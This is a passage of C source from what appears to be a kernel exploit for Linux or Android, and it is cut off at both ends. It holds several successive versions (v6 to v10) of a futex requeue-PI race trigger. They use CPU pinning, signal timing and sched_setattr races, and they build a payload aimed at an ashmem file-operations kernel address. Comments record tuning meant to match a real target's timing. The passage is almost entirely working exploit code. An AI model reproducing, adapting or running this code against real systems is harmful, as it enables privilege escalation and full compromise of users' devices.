    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v5_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static atomic_int g_sched_setattr_done;
static atomic_int g_sched_setattr_ok;
static atomic_int g_sched_setattr_result_ok;
static futex_post_trigger_cb g_post_cb;
static void *g_post_cb_ctx;
static int32_t *g_sched_mutation_state;
static int32_t g_sched_pending_state;
static int32_t g_sched_mutated_state;
static atomic_int g_cb_invoked;
static atomic_int g_cb_result;

static void *waiter_thread_fn_v6(void *arg) {
  (void)arg;
  if (!pin_to_cpu(3)) {
    return NULL;
  }
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v6] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v6] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v6] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {

      for (int spins = 0; spins < TARGET_FUTEX_HANDSHAKE_SPINS &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(TARGET_FUTEX_POLL_USEC);
      }

      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v6] calling post-trigger callback from WAITER "
                "thread after scheduler confirmation\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v6] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v6] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  while (!atomic_load(&owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *consumer_thread_fn_v6(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  fprintf(stderr, "[futex-v6] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v6] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret == 0) {
    atomic_store(&g_sched_setattr_ok, 1);
  }
  atomic_store(&g_sched_setattr_done, 1);
  return NULL;
}

int run_futex_trigger_v6_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0); /* app_main-equivalent's own real placement */

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v6, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v6, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v6] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1); /* real app_main never checks this ret */

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v6] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr,
            "[futex-v6] verify callback never invoked (sigusr1 handler "
            "or consumer sched_setattr did not both succeed)\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v6_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v6] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v6_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static atomic_int g_sigusr1_done;

static void *waiter_thread_fn_v7(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v7] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v7] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v7] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {

      atomic_store(&g_sigusr1_done, 1);

      for (int spins = 0; spins < TARGET_FUTEX_HANDSHAKE_SPINS &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(TARGET_FUTEX_POLL_USEC);
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v7] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v7] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v7] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  while (!atomic_load(&owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *consumer_thread_fn_v7(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  /* THE fix: real consumer tight-spins on G+0x76c (here,
   * g_sigusr1_done) and does not proceed to sched_setattr until it's
   * set -- unlike every earlier variant in this project. */
  while (!atomic_load(&g_sigusr1_done)) {
    __asm__ volatile("yield" ::: "memory");
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  fprintf(stderr, "[futex-v7] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19 (gated on waiter's "
                   "sigusr1 success, matching real G+0x76c timing)\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v7] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret == 0) {
    atomic_store(&g_sched_setattr_ok, 1);
  }
  atomic_store(&g_sched_setattr_done, 1);
  return NULL;
}

int run_futex_trigger_v7_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v7, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v7, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v7] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v7] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v7] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v7_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v7] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v7_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static atomic_int owner_tid_g;

static void sigusr2_noop_handler(int sig) { (void)sig; }

static void *owner_thread_fn_v8(void *arg) {
  (void)arg;
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&owner_tid_g, tid);

  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v8] owner lock target errno=%d\n", errno);
    return NULL;
  }
  while (!atomic_load(&waiter_ready)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  atomic_store(&owner_started, 1);
  errno = 0;
  long ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int saved_errno = errno;
  fprintf(stderr,
          "[futex-v8] owner lock chain ret=%ld errno=%d%s\n", ret,
          saved_errno,
          (ret == -1 && saved_errno == EINTR) ? " (INTERRUPTED)" : "");
  atomic_store(&owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

static void *waiter_thread_fn_v8(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v8] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v8] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v8] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {

      int otid = atomic_load(&owner_tid_g);
      if (otid != 0) {
        long kret = syscall(SYS_tgkill, getpid(), otid, SIGUSR2);
        fprintf(stderr,
                "[futex-v8] tgkill(owner tid=%d, SIGUSR2) ret=%ld errno=%d\n",
                otid, kret, errno);
      }

      atomic_store(&g_sigusr1_done, 1);

      for (int spins = 0; spins < TARGET_FUTEX_HANDSHAKE_SPINS &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(TARGET_FUTEX_POLL_USEC);
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v8] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v8] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }

  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v8] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  /* owner_acquired may never come if owner was interrupted rather than
   * genuinely acquiring -- bound this wait instead of waiting forever. */
  for (int spins = 0; spins < TARGET_FUTEX_OWNER_SPINS && !atomic_load(&owner_acquired);
       spins++) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *consumer_thread_fn_v8(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  while (!atomic_load(&g_sigusr1_done)) {
    __asm__ volatile("yield" ::: "memory");
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  fprintf(stderr, "[futex-v8] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v8] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret == 0) {
    atomic_store(&g_sched_setattr_ok, 1);
  }
  atomic_store(&g_sched_setattr_done, 1);
  return NULL;
}

int run_futex_trigger_v8_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v8] sigaction(SIGUSR2) failed errno=%d\n", errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v8] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v8] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v8] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v8_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v8] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v8_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static void *waiter_thread_fn_v9(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v9] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v9] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v9] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      int otid = atomic_load(&owner_tid_g);
      if (otid != 0) {
        long kret = syscall(SYS_tgkill, getpid(), otid, SIGUSR2);
        fprintf(stderr,
                "[futex-v9] tgkill(owner tid=%d, SIGUSR2) ret=%ld errno=%d\n",
                otid, kret, errno);
      }

      /* THE fix: give the signal real time to land and interrupt
       * owner's blocked rt_mutex_wait_proxy_lock() BEFORE this
       * thread's own UNLOCK_PI below could wake it up the ordinary
       * way instead -- v8 sent the signal then proceeded almost
       * immediately, very likely losing that race every time. */
      usleep(TARGET_FUTEX_LONG_PAUSE_USEC);

      atomic_store(&g_sigusr1_done, 1);

      for (int spins = 0; spins < TARGET_FUTEX_HANDSHAKE_SPINS &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(TARGET_FUTEX_POLL_USEC);
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v9] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v9] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v9] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < TARGET_FUTEX_OWNER_SPINS && !atomic_load(&owner_acquired);
       spins++) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v9_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v9] sigaction(SIGUSR2) failed errno=%d\n", errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v9, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v9] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v9] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v9] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v9_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v9] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v9_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static void *waiter_thread_fn_v10(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v10] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v10] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v10] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {

      atomic_store(&g_sigusr1_done, 1);

      struct timespec spin_deadline;
      clock_gettime(CLOCK_MONOTONIC, &spin_deadline);
      spin_deadline.tv_sec += 1;
      while (!atomic_load(&g_sched_setattr_done)) {
        __asm__ volatile("yield" ::: "memory");
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > spin_deadline.tv_sec ||
            (now.tv_sec == spin_deadline.tv_sec &&
             now.tv_nsec > spin_deadline.tv_nsec)) {
          break;
        }
      }

      atomic_store(&g_sched_setattr_result_ok, atomic_load(&g_sched_setattr_ok));
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v10] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < TARGET_FUTEX_OWNER_SPINS && !atomic_load(&owner_acquired);
       spins++) {
    usleep(TARGET_FUTEX_POLL_USEC);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v10_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v10] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sched_setattr_result_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);

  g_post_cb = NULL;
